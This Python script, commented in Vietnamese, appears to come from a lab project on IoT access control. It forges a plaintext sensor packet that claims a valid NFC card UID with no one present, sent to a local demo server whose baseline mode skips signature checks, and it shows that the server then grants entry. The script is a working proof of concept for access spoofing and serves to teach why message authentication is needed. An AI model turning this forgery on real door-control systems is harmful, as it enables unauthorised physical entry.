#!/usr/bin/env python3
"""Luồng 2 (biến thể — giả mạo được CHO VÀO) — Kẻ xấu gửi thẳng gói tin PLAINTEXT giả,
khai báo có thẻ NFC "hợp lệ" (UID đoán/nghe lén được) dù thực tế không hề đứng trước
cảm biến siêu âm (presence=False). Vì Server --baseline không xác thực chữ ký/toàn vẹn,
UID tự khai báo này được tin tưởng ngay -> minh chứng lỗ hổng "giả mạo quyền ra vào".

Khác với baseline_fake_packet.py (giả vờ KHÔNG có ai qua để che giấu xâm nhập), script
này giả mạo THEO CHIỀU NGƯỢC LẠI: không có ai thật nhưng vẫn được hệ thống "mở cửa".

Cách dùng:
    # Cửa sổ 1: chạy server ở chế độ KHÔNG bảo mật (chỉ để đối chứng)
    python cloud_server/server.py --baseline

    # Cửa sổ 2: kẻ xấu tự khai UID của 1 thẻ hợp lệ (xem cloud_server/keys/authorized_cards.json)
    python attacker_sim/baseline_fake_access.py --uid 04A1B2C3D4
"""

from __future__ import annotations

import argparse
import json
import socket


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=9000)
    parser.add_argument("--device-id", default="attacker-laptop",
                         help="device_id tuy y - server baseline khong kiem tra")
    parser.add_argument("--uid", default="04A1B2C3D4",
                         help="UID gia mao - thu doan trung 1 UID trong authorized_cards.json")
    args = parser.parse_args()

    fake_payload = {
        "distance_cm": 999.0,
        "presence": False,       # KHONG co ai dung truoc cam bien sieu am that
        "nfc_detected": True,    # nhung van tu khai la co quet duoc the
        "nfc_uid": args.uid,
    }

    with socket.create_connection((args.host, args.port), timeout=5.0) as sock:
        sock.sendall((json.dumps({"type": "HELLO", "device_id": args.device_id}) + "\n").encode())
        print("HELLO ->", sock.recv(4096).decode().strip())

        sock.sendall((json.dumps(fake_payload, ensure_ascii=False) + "\n").encode())
        print("Da gui goi tin gia mao (plaintext, tu nhan co the hop le):", fake_payload)

        resp_raw = sock.recv(4096).decode().strip()
        print("Phan hoi Server ->", resp_raw)

        resp = json.loads(resp_raw) if resp_raw else {}
        if resp.get("access_granted"):
            print("\n[KET QUA] Server --baseline da CHO VAO du KHONG CO AI THAT TRUOC CAM BIEN "
                  "-> minh chung lo hong: thieu xac thuc chu ky thi UID tu khai bao khong the tin duoc.")
        else:
            print("\n[KET QUA] Server tu choi (UID gia mao khong trung danh sach hop le) — "
                  "thu lai voi --uid dung 1 UID co trong cloud_server/keys/authorized_cards.json.")


if __name__ == "__main__":
    main()
